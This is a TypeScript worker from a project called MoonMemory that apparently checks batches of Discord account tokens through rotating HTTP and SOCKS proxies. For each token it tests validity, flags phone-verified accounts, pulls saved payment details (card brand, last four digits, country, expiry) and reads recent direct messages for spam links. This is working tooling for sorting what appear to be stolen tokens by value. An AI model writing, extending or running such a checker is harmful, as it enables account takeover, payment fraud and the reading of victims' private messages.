import fetch, { RequestInit, Response } from 'node-fetch';
import { SocksProxyAgent } from 'socks-proxy-agent';
import HttpsProxyAgent from 'https-proxy-agent';
import { MessagePort } from 'worker_threads';
import {PaymentMethod, ThreadChannelMessage, ThreadResult, toCheck, TokenBilling} from '@MoonMemory/types/IChecker.js';
import {
	IDiscordBillingSource,
	IDiscordDMChannel,
	IDiscordMessage,
	IDiscordUser
} from '@MoonMemory/types/DiscordInterfaces.js';
import { ProxyProvider, ProxyType, ProxyAgentPair } from '@MoonMemory/types/Proxy.js';
import randomNumber from '@MoonMemory/utils/random.js';

function timeoutFetch( url: string, options: RequestInit, timeout = 10000 )
{
	return Promise.race( [
		fetch( url, options ),
		new Promise( ( _, reject ) =>
			setTimeout( () => reject( new Error( 'timeout' ) ), timeout )
		)
	] );
}

function getProxyAgentPair( proxy: ProxyProvider ): ProxyAgentPair
{
	const filtered = proxy.proxies.filter(
		proxy =>
			proxy && proxy.valid &&
			( !( proxy.uses.length > 5 ) || new Date().getTime() * 30000 > new Date( proxy.uses.at( -1 )?.date ?? '' ).getTime() )
	);
	const randomProxy = filtered[randomNumber( 0, filtered.length - 1 )];
	switch ( randomProxy.type )
	{
	case ProxyType.HTTP:
		return { proxy: randomProxy, agent: HttpsProxyAgent( `http://${randomProxy.url}` ) };
	case ProxyType.HTTPS:
		return { proxy: randomProxy, agent: HttpsProxyAgent( `https://${randomProxy.url}` ) };
	case ProxyType.SOCKS4:
		return { proxy: randomProxy, agent: new SocksProxyAgent( `socks4://${randomProxy.url}` ) };
	case ProxyType.SOCKS5:
		return { proxy: randomProxy, agent: new SocksProxyAgent( `socks5://${randomProxy.url}` ) };
	}
}

export default async ( { chunk, proxy, id, checklist, spamUrls, port }: { chunk: string[], proxy: ProxyProvider, id: number, checklist: toCheck[], spamUrls: string[], port: MessagePort } ) =>
{
	let errors = 0;
	let tokensValid: string[] = [];
	let tokensBilling: TokenBilling[] = [];
	let tokensPhones: string[] = [];
	let tokensSpammed: string[] = [];
	let invalids = 0;
	let resolved = 0;

	const tokensErrors: Map<string, number> = new Map();

	id = id - 1;

	async function check( token: string ) 
	{
		let currentProxyAgentPair: ProxyAgentPair = getProxyAgentPair( proxy );
		try 
		{
			let valid = false;
			let spam = false;
			let user: IDiscordUser | null = null;
			let payments: PaymentMethod[] = [];

			if ( checklist.includes( toCheck.valid ) ) 
			{
				const userValidResponse: Response = await timeoutFetch( 'https://discord.com/api/v9/users/@me/affinities/guilds', {
					headers: {
						Authorization: token
					},
					agent: currentProxyAgentPair.agent
				} ) as Response;

				currentProxyAgentPair.proxy.uses.push( {
					date: new Date(),
					success: userValidResponse.ok,
					status: userValidResponse.status
				} );

				if ( userValidResponse.ok )
				{
					valid = true;
					tokensValid.push( token );

					currentProxyAgentPair = getProxyAgentPair( proxy );

					const userResponse: Response = await timeoutFetch( 'https://discord.com/api/v9/users/@me', {
						headers: {
							Authorization: token
						},
						agent: currentProxyAgentPair.agent
					} ) as Response;

					currentProxyAgentPair.proxy.uses.push( {
						date: new Date(),
						success: userResponse.ok,
						status: userResponse.status
					} );

					if ( userResponse.ok )
					{
						user = await userResponse.json() as IDiscordUser;
						if ( user.phone ) tokensPhones.push( token );
					}

				}
			}

			if ( checklist.includes( toCheck.billing ) && valid )
			{
				currentProxyAgentPair = getProxyAgentPair( proxy );
				const billingResponse: Response = await timeoutFetch( 'https://discord.com/api/v9/users/@me/billing/payment-sources', {
					headers: {
						Authorization: token
					},
					agent: currentProxyAgentPair.agent
				} ) as Response;

				currentProxyAgentPair.proxy.uses.push( {
					date: new Date(),
					success: billingResponse.ok,
					status: billingResponse.status
				} );

				if ( billingResponse.ok ) 
				{
					const billing: IDiscordBillingSource[] = await billingResponse.json() as IDiscordBillingSource[];
					if ( billing.length > 0 ) 
					{
						for ( const payment of billing ) 
						{
							payments.push( {
								brand: payment.brand,
								last_4: payment.last_4,
								country: payment.billing_address.country,
								expire_month: payment.expires_month,
								expire_year: payment.expires_year,
							} );
						}

						tokensBilling.push( {
							token,
							payments
						} );
					}
				}
			}

			if ( checklist.includes( toCheck.is_spammed ) && valid )
			{
				currentProxyAgentPair = getProxyAgentPair( proxy );
				const dmChannelsResponse: Response = await timeoutFetch( 'https://discord.com/api/v9/users/@me/channels', {
					headers: {
						Authorization: token
					},
					agent: currentProxyAgentPair.agent
				} ) as Response;

				currentProxyAgentPair.proxy.uses.push( {
					date: new Date(),
					success: dmChannelsResponse.ok,
					status: dmChannelsResponse.status
				} );

				if ( dmChannelsResponse.ok )
				{
					const channels: IDiscordDMChannel[] = await dmChannelsResponse.json() as IDiscordDMChannel[];
					if ( channels.length > 10 ) channels.splice( 0, channels.length - 10 );
					for ( const channel of channels )
					{
						currentProxyAgentPair = getProxyAgentPair( proxy );
						const messagesInChannelResponse: Response = await timeoutFetch( `https://discord.com/api/v9/channels/${channel.id}/messages?limit=20`, {
							headers: {
								Authorization: token
							},
							agent: currentProxyAgentPair.agent
						} ) as Response;

						currentProxyAgentPair.proxy.uses.push( {
							date: new Date(),
							success: messagesInChannelResponse.ok,
							status: messagesInChannelResponse.status
						} );

						if ( messagesInChannelResponse.ok )
						{
							const messages: IDiscordMessage[] = await messagesInChannelResponse.json() as IDiscordMessage[];
							for ( const message of messages )
							{

								if ( spamUrls.some( url => message.content.includes( url ) ) )
								{
									spam = true;
									tokensSpammed.push( token );
									break;
								}
							}
						}
					}
				}
			}

			resolved++;
			port.postMessage( {id, resolved, invalids, errors} as ThreadChannelMessage );
			if ( !valid ) invalids++;
			return true;
		}
		catch ( e: any ) 
		{
			if ( e?.message?.includes( 'ETIMEDOUT' ) ) currentProxyAgentPair.proxy.valid = false;
			// if ( e?.message?.includes( 'ECONNRESET' ) )
			if ( e?.message?.includes( 'ECONNREFUSED' ) ) currentProxyAgentPair.proxy.valid = false;
			if ( e?.message?.includes( 'ENOTFOUND' ) ) currentProxyAgentPair.proxy.valid = false;
			if ( e?.message?.includes( 'timeout' ) ) currentProxyAgentPair.proxy.valid = false;

			if ( tokensErrors.has( token ) && tokensErrors.get( token )! >= 3 ) { errors++; return; }
			if ( tokensErrors.has( token ) ) tokensErrors.set( token, tokensErrors.get( token )! + 1 );
			else tokensErrors.set( token, 1 );

			await check( token );
		}
	}

	await Promise.all( chunk.map( check ) );
	const result: ThreadResult = {
		id,
		errors,
		invalids,
		tokensValid,
		tokensBilling,
		tokensPhones,
		tokensSpammed
	};

	return result;
};